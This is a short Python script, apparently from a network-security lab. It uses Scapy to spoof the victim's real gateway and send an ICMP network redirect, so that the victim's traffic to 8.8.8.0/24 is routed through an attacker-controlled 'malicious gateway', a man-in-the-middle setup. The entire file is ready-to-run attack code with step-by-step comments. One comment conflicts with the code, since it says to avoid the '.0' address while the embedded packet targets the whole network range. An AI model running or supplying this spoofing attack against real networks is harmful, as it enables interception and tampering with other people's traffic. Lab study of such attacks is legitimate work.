from scapy.all import *

# CONFIGURATION
VICTIM_IP = "10.9.0.5"
FAKE_ROUTER_IP = "10.9.0.1"       # Must match the victim's actual gateway IP!
MALICIOUS_GATEWAY_IP = "10.9.0.111"
TARGET_NETWORK = "8.8.8.0/24"
IFACE = "eth0"

def send_icmp_redirect():
    # 1. Use the victim's REAL GATEWAY IP as the source 
    ip = IP(src=FAKE_ROUTER_IP, dst=VICTIM_IP)  # Spoof the real gateway

    # 2. Use code=0 (network redirect) + set gateway
    icmp = ICMP(type=5, code=0)
    icmp.gw = MALICIOUS_GATEWAY_IP

    # 3. Embed a packet to a VALID HOST in the target network (not .0)
    inner_ip = IP(src=VICTIM_IP, dst="8.8.8.0/24")  # e.g., router in the target net
    inner_icmp = ICMP(type=8)/b"ABCDEFGH"  # Valid Echo Request

    redirect_pkt = ip/icmp/inner_ip/inner_icmp

    print(f"[+] Sending ICMP Network Redirect for {TARGET_NETWORK} to {VICTIM_IP}")
    send(redirect_pkt, iface=IFACE, verbose=0)

send_icmp_redirect()    